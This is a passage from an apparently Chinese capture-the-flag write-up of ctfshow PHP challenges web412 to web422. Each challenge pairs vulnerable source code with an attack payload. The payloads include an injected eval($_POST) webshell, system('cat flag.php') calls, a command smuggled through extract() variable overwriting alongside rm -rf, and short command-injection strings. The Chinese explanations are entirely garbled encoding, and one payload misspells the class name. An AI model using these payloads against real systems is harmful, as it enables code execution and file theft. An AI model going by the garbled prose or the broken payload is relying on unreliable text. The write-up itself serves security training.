class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span>;&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(â€˜cat flag.phpâ€™);</span><br></pre></td></tr></table></figure><p>å› ä¸ºå°±æ˜¯é¢˜ç›®çš„ä»£ç éƒ½æ˜¯åªæœ‰&lt;?php è€Œæ²¡æœ‰ç»“å°¾ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å†™</p><p>?&gt;ç»™å‰é¢ä»£ç ç»™åŒ…å«äº†ï¼Œç„¶åå°±ç»•è¿‡æ³¨é‡Šäº†ï¼Œç„¶ååé¢åœ¨è‡ªå·±åŠ ä¸€å¥è¯æœ¨é©¬è¿›å»åˆ°flag.phpé‡Œå°±è¡Œäº†</p><p><img src="../images/image-20230331171044704.png" alt="image-20230331171044704"></p><p><img src="../images/image-20230331171032907.png" alt="image-20230331171032907"></p><p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆä¸ä¼šè¦†ç›–æ‰åŸæœ‰çš„flagçš„åŸå› </p><h2 id="web413"><a href="#web413" class="headerlink" title="web413"></a>web413</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 16:19:28</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;/*&#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;*/&#x27;</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure><p>åŸç†å·®ä¸å¤šï¼Œå°±æ˜¯ç»•è¿‡è¿‡æ»¤,å°±æ˜¯åŒ…å«æ³¨é‡Šå°±è¡Œ</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="comment">/*</span></span><br></pre></td></tr></table></figure><h2 id="web414"><a href="#web414" class="headerlink" title="web414"></a>web414</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 16:43:53</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>==<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sqrt</span>(<span class="variable">$ctfshow</span>)&gt;=<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$flag</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„sqrtæ˜¯è®¡ç®—å¹³æ–¹æ ¹çš„æ„æ€</p><p><strong>å¸ƒå°”å€¼trueå’Œä»»æ„å­—ç¬¦ä¸²éƒ½å¼±ç›¸ç­‰</strong></p><p>intval($flag)    â€”â€”-&gt;   0</p><p>æ‰€ä»¥éšä¾¿ä¼ ä¸ªè´Ÿå€¼å°±è¡Œäº†</p><h2 id="web415"><a href="#web415" class="headerlink" title="web415"></a>web415</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 19:15:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$k</span> = <span class="variable">$_GET</span>[k];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>==<span class="string">&#x27;getflag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$k</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>== ï¼šå¼±ç­‰äºã€‚åœ¨æ¯”è¾ƒå‰ä¼šå…ˆæŠŠä¸¤ç§å­—ç¬¦ä¸²ç±»å‹è½¬æˆç›¸åŒçš„å†è¿›è¡Œæ¯”è¾ƒã€‚ç®€å•çš„è¯´ï¼Œå®ƒä¸ä¼šæ¯”è¾ƒå˜é‡ç±»å‹ï¼Œåªæ¯”è¾ƒå€¼ã€‚</p><p>è‹¥ä¸€ä¸ªæ•°å­—å’Œä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒæˆ–è€…è¿›è¡Œè¿ç®—æ—¶ï¼ŒPHPä¼šæŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•°å­—å†è¿›è¡Œæ¯”è¾ƒã€‚è‹¥å­—ç¬¦ä¸²ä»¥æ•°å­—å¼€å¤´ï¼Œåˆ™å–å¼€å¤´æ•°å­—ä½œä¸ºè½¬æ¢ç»“æœï¼Œä¸èƒ½è½¬æ¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚â€aaaâ€æ˜¯ä¸èƒ½è½¬æ¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²ï¼Œè€Œâ€123â€æˆ–â€123aaâ€å°±æ˜¯å¯ä»¥è½¬æ¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²ï¼‰æˆ–nullï¼Œåˆ™è½¬æ¢ä¸º0</p><p><strong>å‡½æ•°åã€æ–¹æ³•åã€ç±»å ä¸åŒºåˆ†å¤§å°å†™</strong></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?k=Getflag</span><br></pre></td></tr></table></figure><h2 id="web416"><a href="#web416" class="headerlink" title="web416"></a>web416</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 19:54:23</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;fake flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span> <span class="keyword">extends</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="variable">$_GET</span>[f]);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230331222734499.png" alt="image-20230331222734499"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=cft::<span class="variable constant_">flag</span></span><br></pre></td></tr></table></figure><h2 id="web417"><a href="#web417" class="headerlink" title="web417"></a>web417</h2><p>é¢˜ç›®</p><p>è¿™é‡Œä¸‹è½½ä¸‹æ¥é¢˜ç›®ç»™çš„phpä»£ç ï¼Œç„¶åè§£ç å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$c</span>==<span class="string">&#x27;show&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf=show</span><br></pre></td></tr></table></figure><h2 id="web418"><a href="#web418" class="headerlink" title="web418"></a>web418</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-26 23:52:58</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$key</span>= <span class="number">0</span>;</span><br><span class="line"><span class="variable">$clear</span>=<span class="string">&#x27;clear.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–å‚æ•°</span></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"><span class="comment">//åŒ…å«æ¸…ç†è„šæœ¬</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$clear</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span>===<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="comment">//å¸®é»‘é˜”å†™å¥½åé—¨</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;&lt;?php &#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;?&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$die</span>?<span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>):<span class="title function_ invoke__">clear</span>(<span class="variable">$clear</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>=== ï¼šå¼ºç­‰äºã€‚åœ¨æ¯”è¾ƒå‰ä¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²ç±»å‹æ˜¯å¦ç›¸åŒå†è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç±»å‹ä¸åŒç›´æ¥è¿”å›ä¸ç›¸ç­‰ã€‚æ—¢æ¯”è¾ƒå€¼ä¹Ÿæ¯”è¾ƒç±»å‹ã€‚</p><p>è¿™é‡Œæœ‰ç‚¹è¯¯å¯¼è®©ä½ ï¼Œå»å†™åé—¨ï¼Œä½†æ˜¯$key===0x36dè¿™ä¸ªæ˜¯å¼ºç­‰äº,0x36d è¿™ä¸ªæ˜¯integeræ•´å½¢ï¼Œä½†æ˜¯ä¼ çš„å­—ç¬¦ä¸²å´æ˜¯å­—ç¬¦å‹ï¼Œç»•ä¸è¿‡å»ï¼Œæ‰€ä»¥è¿™é¢˜ç”¨å˜é‡è¦†ç›–ä¿®æ”¹$clearå°±å¯ä»¥äº†ï¼Œ</p><p><strong>extract</strong>   â€”â€”-&gt;   å˜é‡è¦†ç›–</p><p><img src="../images/image-20230401161846730.png" alt="image-20230401161846730"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">die</span>=<span class="number">0</span>&amp;clear=;cp flag.php flag.txt</span><br></pre></td></tr></table></figure><p>payloadçš„æ„æ€æ˜¯ï¼Œå› ä¸ºifé‚£ç»•ä¸è¿‡å»äº†ï¼Œæ‰€ä»¥ä¼šæ‰§è¡Œä¸‹é¢çš„è¯­å¥ï¼Œç„¶åä¸ºäº†èƒ½æ‰§è¡Œclear($clear),æ‰€ä»¥å°±è®©$dieä¸º0ï¼Œç„¶åå°±å¯ä»¥æ‰§è¡Œåˆ°clearäº†</p><p><strong>è¿™é‡ŒåŠ çš„åˆ†å·æ˜¯ä¸ºäº†ä¸è®©rm -rfåˆ æ‰æ–‡ä»¶</strong></p><p>ç„¶åå°±ä¼šæ‰§è¡Œclear(rm -rf;cp flag.php flag.txt)</p><h2 id="web419"><a href="#web419" class="headerlink" title="web419"></a>web419</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:36:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">17</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=echo `cat f*`;</span><br></pre></td></tr></table></figure><p><strong>payload2</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=eval($_POST[1]);&amp;1=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web420"><a href="#web420" class="headerlink" title="web420"></a>web420</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:41:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯æ˜¯å…ˆç”¨    ls æŸ¥æ‰¾flagä½ç½®ï¼Œç„¶åç”¨<code>ls ../</code>æ‰¾åˆ°äº†flagä½ç½®ï¼Œç„¶åç›´æ¥è¯»å–</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl ../*</span><br></pre></td></tr></table></figure><h2 id="web421"><a href="#web421" class="headerlink" title="web421"></a>web421</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-29 01:42:50</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">6</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl *</span><br></pre></td></tr></table></figure><h2 id="web422"><a href="#web422" class="headerlink" title="web422"></a>web422</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 